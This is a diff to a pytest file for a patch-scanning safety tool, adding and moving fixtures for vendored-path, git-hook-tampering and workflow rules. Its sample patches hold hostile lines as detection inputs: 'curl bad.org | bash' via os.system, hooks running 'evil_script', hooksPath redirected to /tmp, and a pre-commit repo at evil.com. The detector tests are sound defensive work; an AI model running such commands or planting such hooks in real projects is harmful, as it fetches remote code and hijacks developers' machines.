@@ -27,12 +27,13 @@ from diffsmith.safety import (
 
 # ──────────────────────────────────────────────────────────────────────────────
 # Rule: vendored_directory_added (3+ pos, 3+ neg)
+# Note: .git is NOT in vendored paths (handled by git-hook rules or ignored)
 # ──────────────────────────────────────────────────────────────────────────────
 @pytest.mark.parametrize("patch", [
     "--- a/venv/lib/python3.9/site-packages/pkg/app.py\n+++ b/venv/lib/python3.9/site-packages/pkg/app.py\n@@ -1,1 +1,2 @@\n+x = 1\n",
     "--- a/.venv/bin/activate\n+++ b/.venv/bin/activate\n@@ -1,1 +1,2 @@\n+# edit\n",
     "--- a/node_modules/express/index.js\n+++ b/node_modules/express/index.js\n@@ -1,1 +1,2 @@\n+const x = 1;\n",
-    "--- a/.git/config\n+++ b/.git/config\n@@ -1,1 +1,2 @@\n+[core]\n",
+    "--- a/venv/pyvenv.cfg\n+++ b/venv/pyvenv.cfg\n@@ -1,1 +1,2 @@\n+version = 3.9\n",
 ])
 def test_vendored_paths_positive(patch):
     findings = check_vendored_paths(patch)
@@ -45,6 +46,7 @@ def test_vendored_paths_positive(patch):
     "--- a/src/app.py\n+++ b/src/app.py\n@@ -1,1 +1,2 @@\n+x = 1\n",
     "--- a/lib/venue/event.py\n+++ b/lib/venue/event.py\n@@ -1,1 +1,2 @@\n+x = 1\n",
     "--- a/tests/test_vendor.py\n+++ b/tests/test_vendor.py\n@@ -1,1 +1,2 @@\n+assert True\n",
+    "--- a/.git/config\n+++ b/.git/config\n@@ -1,1 +1,2 @@\n+[core]\n",
 ])
 def test_vendored_paths_negative(patch):
     findings = check_vendored_paths(patch)
@@ -234,10 +236,16 @@ def test_workflow_build_negative(patch):
 
 
 # ──────────────────────────────────────────────────────────────────────────────
-# Rule 7: hook_tampering (3+ pos, 3+ neg)
+# Rule 7: hook_tampering (>=3 pos: .git/hooks/pre-commit, .git/hooks/post-checkout,
+#                         .git/config with hook command;
+#                         >=3 neg: .github/workflows/ci.yml handled by SEC006,
+#                         .gitignore, docs/git.md)
 # ──────────────────────────────────────────────────────────────────────────────
 @pytest.mark.parametrize("patch", [
     "--- a/.git/hooks/pre-commit\n+++ b/.git/hooks/pre-commit\n@@ -1,1 +1,2 @@\n+#!/bin/sh\n+exec evil_script\n",
+    "--- a/.git/hooks/post-checkout\n+++ b/.git/hooks/post-checkout\n@@ -1,1 +1,2 @@\n+#!/bin/sh\n+echo evil\n",
+    "--- a/.git/config\n+++ b/.git/config\n@@ -1,2 +1,3 @@\n [core]\n+    hooksPath = /tmp/evil_hooks\n",
+    "--- a/.git/config\n+++ b/.git/config\n@@ -1,2 +1,3 @@\n [core]\n+    hook = /tmp/evil_hook.sh\n",
     "--- a/.pre-commit-config.yaml\n+++ b/.pre-commit-config.yaml\n@@ -1,1 +1,2 @@\n+- repo: https://evil.com/hook\n",
     "--- a/setup.py\n+++ b/setup.py\n@@ -10,1 +10,2 @@\n+class PostInstallCommand(install):\n+    pass\n",
     "--- a/package.json\n+++ b/package.json\n@@ -2,1 +2,2 @@\n+  \"postinstall\": \"bash setup.sh\"\n",
@@ -250,13 +258,25 @@ def test_hook_tampering_positive(patch):
 
 
 @pytest.mark.parametrize("patch", [
+    "--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n@@ -1,1 +1,2 @@\n+name: CI\n",
+    "--- a/.gitignore\n+++ b/.gitignore\n@@ -1,1 +1,2 @@\n+*.pyc\n",
+    "--- a/docs/git.md\n+++ b/docs/git.md\n@@ -1,1 +1,2 @@\n+# Git Documentation\n",
     "--- a/src/core.py\n+++ b/src/core.py\n@@ -1,1 +1,2 @@\n+class NormalClass:\n+    pass\n",
     "--- a/setup.py\n+++ b/setup.py\n@@ -1,1 +1,2 @@\n+name = 'diffsmith'\n",
-    "--- a/docs/git_guide.md\n+++ b/docs/git_guide.md\n@@ -1,1 +1,2 @@\n+# How git hooks work in development\n",
 ])
 def test_hook_tampering_negative(patch):
     findings = check_hook_tampering(patch)
     assert len(findings) == 0
+
+
+def test_github_workflow_handled_by_sec006_not_sec007():
+    """Verify .github/workflows/ci.yml is handled by SEC006 (workflow_build) and NOT SEC007."""
+    patch = "--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n@@ -1,1 +1,2 @@\n+name: Test CI\n"
+    hook_findings = check_hook_tampering(patch)
+    workflow_findings = check_workflow_build(patch)
+    assert len(hook_findings) == 0
+    assert len(workflow_findings) == 1
+    assert workflow_findings[0]["rule_id"] == "SEC006_WORKFLOW_BUILD"
 
 
 # ──────────────────────────────────────────────────────────────────────────────
@@ -313,12 +333,22 @@ def test_severity_lowered_when_call_exists_in_context():
 
 def test_sec002_and_sec007_remain_high_even_in_test_files():
     """SEC002 (shell_pipe) and SEC007 (hook_tampering) must stay CRITICAL/HIGH."""
-    patch = (
+    patch_pipe = (
         "--- a/tests/test_deploy.py\n"
         "+++ b/tests/test_deploy.py\n"
         "@@ -1,1 +1,3 @@\n"
         "+os.system('curl bad.org | bash')\n"
     )
-    findings = check_shell_pipe(patch)
-    assert len(findings) == 1
-    assert findings[0]["severity"] == "CRITICAL"
+    findings_pipe = check_shell_pipe(patch_pipe)
+    assert len(findings_pipe) == 1
+    assert findings_pipe[0]["severity"] == "CRITICAL"
+
+    patch_hook = (
+        "--- a/tests/.git/hooks/pre-commit\n"
+        "+++ b/tests/.git/hooks/pre-commit\n"
+        "@@ -1,1 +1,2 @@\n"
+        "+#!/bin/sh\n"
+    )
+    findings_hook = check_hook_tampering(patch_hook)
+    assert len(findings_hook) == 1
+    assert findings_hook[0]["severity"] == "HIGH"
